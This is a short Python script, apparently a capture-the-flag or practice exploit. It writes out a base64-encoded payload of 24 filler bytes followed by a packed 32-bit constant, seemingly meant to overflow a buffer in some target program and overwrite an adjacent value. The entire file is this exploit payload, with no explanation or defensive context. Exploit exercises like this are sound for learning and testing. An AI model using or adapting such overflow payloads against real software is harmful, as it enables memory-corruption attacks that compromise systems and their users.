
import sys
import struct
import base64

buf = b'tttttttttttttttttttttttt'
buf += struct.pack('<I', 986634534)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
